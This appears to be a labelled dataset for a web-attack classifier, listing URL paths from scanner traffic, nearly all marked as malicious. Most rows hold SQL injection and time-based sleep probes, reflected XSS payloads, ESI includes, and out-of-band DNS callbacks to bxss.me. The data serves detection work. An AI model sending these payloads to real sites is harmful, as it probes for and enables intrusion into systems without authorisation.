sentences	labels
/****/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/****/zdlygk/bzxajgc/szss' and 2*3*8=6*8 and 'n39j'='n39j/plx.htm \r\n\r\n 	 1
/****/yqzt/qyddt/202003/t20200313_244054.html' and 'x'='y \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid[1]==extractvalue(1,concat(char(126),md5(1270704909)))&i_columnid[0]=exp&i_webid=1&type=1 \r\n\r\n 	 1
/****/qyjbxx/fzlc/ \r\n\r\n 	 1
/****/js/jsencrypt' and 2*3*8=6*8 and 'ohc5'='ohc5/jsencrypt.min.js \r\n\r\n 	 1
/******/wd-demo/index.php?c=prompt(777) \r\n\r\n 	 1
/****/zdlygk/gytdsdfwzs' and 2*3*8=6*8 and 'vghy'='vghy/wzs/zcwj.htm \r\n\r\n 	 1
/****/kjdt/202011/t20201125_256669.html" and "x"="y \r\n\r\n 	 1
/********/wf_work_stat_setting.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','vhuvv')) \r\n\r\n 	 1
/***/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448') and 6707=3544 and ('1'='1&wbfileid=51419 \r\n\r\n 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/****/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 1
/****/system/2021/09/01'""/><img src=javascript:alert(1827) /013442863.shtml \r\n\r\n 	 1
/***/2020/11/20/art_5264_221965.html/<img src="javascript:alert(890)"> \r\n\r\n 	 1
/*********/privacy'||'.aspx \r\n\r\n 	 1
/****/qzfwj/5619/5628/index.html \r\n\r\n 	 1
/*****/wp-content/plugins/nextgen-gallery/nggallery.php?test-head='"">alert(777); \r\n\r\n 	 1
/**/ui/widgets/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/validity.js \r\n\r\n 	 1
/***/?refresh=';window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();' \r\n\r\n 	 1
/**********/system/2021/06/30/javascript:void(0); \r\n\r\n 	 1
/**/system/2021/12/13/javascript:void(0); \r\n\r\n 	 1
/******/resource/code/datainput.jsp?owner=%') or 2438=2438 and '%'=' \r\n\r\n 	 1
/******/457/layout.js/"><script>alert(7671)</script> \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 8459=4076  \r\n\r\n 	 1
/****/admin/system.html?step=2&device=et"/><script>alert(777);</script>bh0 \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/jsencrypt/jsencrypt.min.js \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images<esi:include src=""http://bxss.me/rpb.png""/>/condition.js \r\n\r\n 	 1
/******/games.php?des='">><script>alert(' 777')</script> \r\n\r\n 	 1
/************/template'||'/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 1
/****/category/silumaoyi?page=1 and 8369=8369-- \r\n\r\n 	 1
/**/ui/widgets/cookie/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/****/js' and 2*3*8=6*8 and 'qxoq'='qxoq/encrypt/jbase64.js \r\n\r\n 	 1
/****/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 \r\n\r\n 	 1
/******/2.cer \r\n\r\n 	 1
/****/system/2021/04/22'""/>%uff1cscript%uff1ealert%uff082391%uff09%uff1c/script%uff1e/013373702.shtml \r\n\r\n 	 1
/*/public/viewclick/?addclick=0""xor(if(now()=sysdate(),sleep(6),0))xor""z&classid=132&id=270 \r\n\r\n 	 1
/*****/system/2021/12/16/javascript:void(); \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' or 7012=8551 and '%%'='% \r\n\r\n 	 1
/*****/20200927/javascript:void(0); \r\n\r\n 	 1
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') or 0796=0796 and '%'=' \r\n\r\n 	 1
/****/category/yuanquzhaoshang?page=1</script><script>j10g(9529)</script> \r\n\r\n 	 1
/****/web/sa3/addholiday.do \r\n\r\n 	 1
/**/gywm/ \r\n\r\n 	 1
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 1
/***/0/01/41/03/1410398_388057.jpg \r\n\r\n 	 1
/vc"" and 2*3*8=6*8 and ""nkae""=""nkae/**/lib/jquery/jquery.min.js \r\n\r\n 	 1
/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/lib/easyui/plugins/jquery.linkbutton.js \r\n\r\n 	 1
/****/zfwjn/1088/1103/list.html?new='""()&%<acx><script >thmh(9204)</script> \r\n\r\n 	 1
/****/mswpmm/common/signin.aspx?btnsignin=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/***/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/**/ui/widgets/validity/validity%' and 2*3*8=6*8 and 'tnox'!='tnox%.js \r\n\r\n 	 1
/****/czgk/bmyjs/rmtt/wl/201602/encodeuricomponent(window.location.href) \r\n\r\n 	 1
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 1
/*******/jrhm4vj.php \r\n\r\n 	 1
/****/genixcms-master/genixcms-master/gxadmin/index.php?page=posts&q=1'alert(777) \r\n\r\n 	 1
/****/web/search?perpage=20; waitfor delay '0:0:2&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10 \r\n\r\n 	 1
/****/ssgs/zggj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/5/language.js/""><script>alert(7545)</script> \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&p=1&q=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/zfwjn/1079/"".gethostbyname(lc(""hitjs"".""lhyqpdtt7d862.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(90).chr(108).chr(84).""/list.html \r\n\r\n 	 1
/*******/m17uj.php \r\n\r\n 	 1
/sample.php?theme=<script>alert(/***********/)</script> \r\n\r\n 	 1
/***/com/_log/access.log \r\n\r\n 	 1
/******/system/2021/09/08/javascript:void(); \r\n\r\n 	 1
/************/search.do?'""()&%<acx><script >qny4(9050)</script> \r\n\r\n 	 1
/**/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1) and 0084=0084#&token=1 \r\n\r\n 	 1
socket.gethostbyname(""hitpc"" ""bnayqclb6daa5.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/css.js \r\n\r\n 	 1
/******/jslib/grouppic/http://bxss.me/t/fit.txt?.ad-gallery.js \r\n\r\n 	 1
/**/ui/css' and 2*3*8=6*8 and 'bf4i'='bf4i/page.css \r\n\r\n 	 1
/****/xxgkml/zfczyjs//xfs.bxss.me.html \r\n\r\n 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/***/wp-admin/admin-ajax.php \r\n\r\n 	 1
/**/ourbusiness/rdandmanufacture/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/*****/system/2009/07/16/002775320.shtml \r\n\r\n 	 1
/****/system/2017/02/15/javascript:window.close(); \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064'""()&%<acx><script >khwe(9547)</script>/list.html \r\n\r\n 	 1
/****/web/search?searchword=1%') or 6110=6110  \r\n\r\n 	 1
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 1
/**/ui/lib/easyui/plugins' and 2*3*8=6*8 and 'qvco'='qvco/jquery.linkbutton.js \r\n\r\n 	 1
/*/210514-1/'""()&%<acx><script >t2nb(9477)</script>/06c5a0c81119dca7da22fc4fd96413d2.js \r\n\r\n 	 1
/******/admin/edit.php?menu="">pt>alert(777); script>pt> \r\n\r\n 	 1
/****/dczj/wjdc' and 2*3*8=6*8 and '6chc'='6chc.htm \r\n\r\n 	 1
/****/web/search?channelid=234439') and 5159=5159  \r\n\r\n 	 1
/***/col32/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.html \r\n\r\n 	 1
/************/interfaces/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=if(now()=sysdate(),sleep(15),0)&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/zfwjn/1088/1110/list.html?new='""()&%<acx><script >pafm(9942)</script> \r\n\r\n 	 1
/****/system/2015/12/22/javascript:dozoom(14) \r\n\r\n 	 1
/****/form.jspx?id="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""//&channelid=1542 \r\n\r\n 	 1
/**/index.php?do=post&id=309&c=dt&a=goods& \r\n\r\n 	 1
/xinanyanjiu' and 2*3*8=6*8 and 'inc6'='inc6/************/guzhiqihuo/index_9.html \r\n\r\n 	 1
/******/1/layout.js/<img src="javascript:alert(496)"> \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/tjj/zfxxgkml_2127/jytabljg_2061/list.html \r\n\r\n 	 1
socket.gethostbyname(""hitzk"" ""adjmyrmhaa66a.bxss.me."")[3].to_s) ""/*/xys.css \r\n\r\n 	 1
/****/gjgk/gjjj/" and "x"="y \r\n\r\n 	 1
/****/system/2017/02/15/javascript:dozoom(14) \r\n\r\n 	 1
/*****/system/2019/04/30/javascript:void(0); \r\n\r\n 	 1
/****/zpdt/202010/t20201009_254278.html and 1>1 \r\n\r\n 	 1
/****/server-session-details.jsp?hostname=""/>alert(777) \r\n\r\n 	 1
/******/1/layout.js/"><script>alert(497)</script> \r\n\r\n 	 1
/****/index.php?title=acunetixtest485479&action=submit \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/ycs/hlx' and 2*3*8=6*8 and '5anf'='5anf/xmb_gzdxb.htm \r\n\r\n 	 1
/****/czgk/bmyjs/zzqfyxt/lwsrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/******/system/2020/09/21/javascript:void(0); \r\n\r\n 	 1
/****/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=620cfd342eec49aab04f2e35c63427cf.docx' and 5309=5309 and 'ajst'='ajst \r\n\r\n 	 1
/ztzl%' and 2*3*8=6*8 and 'hc9m'!='hc9m%/******/zcwj/1.htm \r\n\r\n 	 1
socket.gethostbyname(""hitwo"" ""kfxjlwrtb09d0.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/main.css \r\n\r\n 	 1
/****/zdlygk/if(now()=sysdate(),sleep(12),0).htm \r\n\r\n 	 1
/***/resource/fonts/fontawesome-webfont.ttf?v="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""// \r\n\r\n 	 1
socket.gethostbyname('hitqp' 'tgqlreona377f.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js \r\n\r\n 	 1
/************/search.do?tpl=16&q=请输入关键词' and 2*3*8=6*8 and 'b0sq'='b0sq&websiteid=110105008056111&pg=1&category=1&cateid=1&p=1 \r\n\r\n 	 1
/****/ygzpxx/201810/t20181031_194422.html and 1=1 \r\n\r\n 	 1
/***/index.php?do=post&id=462&c=dt&a=goods& \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/searchbtn.js/"><script>alert(4664)</script> \r\n\r\n 	 1
/**/mediacenter/news/" and "x"="y \r\n\r\n 	 1
/jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/plugin/mainframe/spellcheck.js \r\n\r\n 	 1
/*/action/showinfo/?classid=0'xor(if(now()=sysdate(),sleep(22),0))xor'z&id=10299 \r\n\r\n 	 1
/****/system/2021/06/07/javascript:window.print() \r\n\r\n 	 1
/********/customer/style/;<script/acu src=//xss.bxss.me/t/xss.js?9278></script> \r\n\r\n 	 1
/***/general/diary/new/submit.php \r\n\r\n 	 1
/****/category/fengxianfangfan?page=1 and 3631=3631 \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=75a45d85bd6c4a2d8c6e0c9614767fef.doc and 7626=7626-- ekvc \r\n\r\n 	 1
/****/zdlygk%' and 2*3*8=6*8 and 'xje6'!='xje6%/gczlzl/1.htm \r\n\r\n 	 1
/*******/abmdsrn.php \r\n\r\n 	 1
/****/phpliteadmin_v1-1/phpliteadmin.php?table=""/>alert(777) \r\n\r\n 	 1
/******/2018index/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/web/jpage/'""()&%<acx><script >evhi(9822)</script>/default/css/jpage.css \r\n\r\n 	 1
/*************/pm_gatt_inc.aspx?project_id=sys.fn_varbintohexstr(hashbytes('md5','fu19g')) \r\n\r\n 	 1
/******/resource/code/datainput.jsp?owner=') and 2533=2533  \r\n\r\n 	 1
/****/http://bxss.me/t/fit.txt?.jpg/201610/t20161016_531.html \r\n\r\n 	 1
/***/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
/****/20210527/javascript:void(0); \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(18),0))xor'z/**********/graphic/2020-02-27/8981.html \r\n\r\n 	 1
/****/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 1
/****/web/search?channelid=253477&keyword=the&orderby=-docreltime&outlinepage=10&page=2&perpage=15&searchword=0""xor(if(now()=sysdate(),sleep(15),0))xor""z \r\n\r\n 	 1
/****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777) \r\n\r\n 	 1
/****/search.jspx?q=";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();"// \r\n\r\n 	 1
/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1<esi:include src=""http://bxss.me/rpb.png""/>&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/zt/yqfkzccs/dsjzccs/gyszc/\"javascript:void(0)\" \r\n\r\n 	 1
/******/zlhz/"><script>alert(189)</script> \r\n\r\n 	 1
/****/system/2021/06/27/javascript:window.print() \r\n\r\n 	 1
/****/mtgz/2021_mtgz/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/t20210505_273338.html \r\n\r\n 	 1
/****//xfs.bxss.me/sgaj/ \r\n\r\n 	 1
/************/template'""()&%<acx><script >vpin(9140)</script>/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js \r\n\r\n 	 1
/****/category/jishuchuangxin?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  \r\n\r\n 	 1
/************/categorysearch.do?cateid=bxss.me&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/***/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> \r\n\r\n 	 1
/xwdt' and 2*3*8=6*8 and 'm9u8'='m9u8/****/ghby/gzdt.htm \r\n\r\n 	 1
/**/system/count/0006008/000000000000/window.location.href \r\n\r\n 	 1
/*******/4sbb4zf.php \r\n\r\n 	 1
/****/wdsjs/hfswsj/http://bxss.me/t/fit.txt?.jpg.html \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1') and 9822=9822  \r\n\r\n 	 1
/**/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/****/byszf/202109/t20210924_186864.html?leader='""()&%<acx><script >smnz(9771)</script> \r\n\r\n 	 1
/***/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 1
/****/wd-demo/index.php?c=prompt(777) \r\n\r\n 	 1
/*****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid=233296&i_columnid=33&i_webid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&type=3 \r\n\r\n 	 1
/'""()&%<acx><script >8fii(9120)</script>/******/2014/list.html \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419' or 0598=0598  \r\n\r\n 	 1
socket.gethostbyname(""hitem"" ""kvfaqpsy44544.bxss.me."")[3].to_s) ""/*********/linkbutton.css \r\n\r\n 	 1
/******/resource/if(now()=sysdate(),sleep(12),0)/centercutimg.js \r\n\r\n 	 1
/************/search.do?q='""()&%<acx><script >zn74(9137)</script> \r\n\r\n 	 1
/z'""()&%<acx><script >br7s(9741)</script>/191211-8/*****/d7c921b2c59d284228d4f6d2d18d0cae.css \r\n\r\n 	 1
/*****/system/2021/12/21/javascript:window.close(); \r\n\r\n 	 1
/****/index.cfm?field="">alert(777) \r\n\r\n 	 1
/******/n42791/n42792/c1649472/content'||'.html \r\n\r\n 	 1
/****/zdlygk/gytdsdfwzs%' and 2*3*8=6*8 and '7j7e'!='7j7e%/zzq/zcwj.htm \r\n\r\n 	 1
/****/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/'""()&%<acx><script >covi(9370)</script>.html \r\n\r\n 	 1
/system' and 2*3*8=6*8 and 'yyjb'='yyjb/********/js/formfunc.js \r\n\r\n 	 1
/**/wp-admin/admin-ajax.php \r\n\r\n 	 1
/*/210716/index/3494307764'""()&%<acx><script >gn73(9815)</script>da7f36733716be7abc7a9b.js \r\n\r\n 	 1
/****/javascript:void(0); \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/1.htm \r\n\r\n 	 1
/wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=&calendar_id=<script language='php'>echo 10516*61501;</script>&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=2018 \r\n\r\n 	 1
/***/help.php \r\n\r\n 	 1
/**/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/******/resource/js/northwind/ \r\n\r\n 	 1
/****/qyzdsx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/js/encrypt/md5.js;;";;alert(300);;s=" \r\n\r\n 	 1
/***********/qiquanzhuanti/2017-02-16/288.html \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/wzs' and 2*3*8=6*8 and 'hpkv'='hpkv/ltq/xmb_gzdxb.htm \r\n\r\n 	 1
/****/system/count/0036003/000000000000/window.location.href \r\n\r\n 	 1
/****/mytag_jsa.php?aid=9090 \r\n\r\n 	 1
/****/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(15),0))xor""z.aspx \r\n\r\n 	 1
/***/index.jsp/*/-->'""></iframe></script></style></title></textarea><script >alert(90958)</script> \r\n\r\n 	 1
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=392&i_articleid=192567 \r\n\r\n 	 1
/****/gjdjbn/djbn_zypl/ \r\n\r\n 	 1
/****/gccb/jcgc/ \r\n\r\n 	 1
/z'""()&%<acx><script >he7f(9327)</script>/******/index/d7c921b2c59d284228d4f6d2d18d0cae.css \r\n\r\n 	 1
/******/system/2021/11/15/javascript:void(0); \r\n\r\n 	 1
/***/col2/index.html"" and ""x""=""y \r\n\r\n 	 1
/****/gjmt/gjmyt/ and 1=1 \r\n\r\n 	 1
/**********/system/more/253000000000000/0002/javascript:void(); \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(4644)</script>?_=1630312093914 \r\n\r\n 	 1
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 1
/*******/picture/sight/index.shtml/<img src="javascript:alert(88)"> \r\n\r\n 	 1
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jquery/jquery.js \r\n\r\n 	 1
/****/abantecart/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> \r\n\r\n 	 1
/**/index.php?show_record_links=1&table=products"">alert(777);&add_new_item=1 \r\n\r\n 	 1
/****/web/search?channelid=234439') and 6154=3039 and ('1'='1&orderby=relevance&perpage=24&searchword=1 \r\n\r\n 	 1
/****/zdlygk/ncwywfgz' and 2*3*8=6*8 and '69mn'='69mn/ycs/lws/xmb_gzdxb.htm \r\n\r\n 	 1
/***/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 1
/******/resource/js/news/video/mp4/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid'""()&%<acx><script >vpin(9560)</script>.js \r\n\r\n 	 1
/****/czgk/bmjs/zzqjcyxt/qtxsjcy/\"javascript:void(0)\" \r\n\r\n 	 1
/*****/system/2019/05/15/javascript:window.print() \r\n\r\n 	 1
/****/zdlygk/ncwywfgz'||'/zws/yzq/xmb_gzdxb.htm \r\n\r\n 	 1
/*****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/visitcount/visit.jsp/"><script>alert(2082)</script>?type=3&i_webid=1&i_columnid=392&i_articleid=192569 \r\n\r\n 	 1
/vc<esi:include src=""http://*******/rpb.png""/>/ui/lib/easyui/plugins/jquery.window.js \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]==2and 3 in &i_webid[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1192476309')))>'0&type=1 \r\n\r\n 	 1
/****/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 1
/***/col7/index.html"" and ""x""=""y \r\n\r\n 	 1
/***/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 1
/****/web/search?channelid=299868%' and 0301=0301 and '%%'='%&perpage=1000 \r\n\r\n 	 1
/*****/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 1
/****/date.php \r\n\r\n 	 1
/************/template/jcse/website'||'.js \r\n\r\n 	 1
/******/download/downfile.jsp?filename=1b0848360b3c411a9c69b356cf0165e0.doc&classid=0%'and(0)='0'and'%'=' \r\n\r\n 	 1
/****/category/pinpaijianshe?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(46891)</script> \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/criteria//xfs.bxss.me.js \r\n\r\n 	 1
/***********/yuedubaogao/2021-09-02/javascript:void(0) \r\n\r\n 	 1
/**********/system/2021/11/12/javascript:void(); \r\n\r\n 	 1
/*******/jlcorevalue?id=51%';select sleep(5) \r\n\r\n 	 1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqjgswglj/\"javascript:void(0)\" \r\n\r\n 	 1
/****/mtgz/mt17_6390/ \r\n\r\n 	 1
/******/system/2020/10/12/javascript:void(0); \r\n\r\n 	 1
/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=36&i_webid=1&type=2&url=0'xor(if(now()=sysdate(),sleep(15),0))xor'z \r\n\r\n 	 1
/**/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 1
/**/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 1
/*****/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 \r\n\r\n 	 1
/****/? \r\n\r\n 	 1
/tencent:/*******/tencent:/*******/tencent:/*******/tencent:/*******/tencent:/*******/?uin=1969854010' or (1=2) and 'a'='a&site=&menu=yes \r\n\r\n 	 1
/****/"".gethostbyname(lc(""hityq"".""fkkmhlgo6dd4c.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(101).chr(69).chr(118).chr(71).""/2014/list.html \r\n\r\n 	 1
/******/system/2021/03/04/javascript:window.close(); \r\n\r\n 	 1
/_dwr/*********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.js \r\n\r\n 	 1
socket.gethostbyname('hityh' 'msasboncb276e.bxss.me.')[3].to_s) '/*******/jquery.parser.js \r\n\r\n 	 1
/***/system/2009/06/10/002755179.shtml \r\n\r\n 	 1
/******/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user \r\n\r\n 	 1
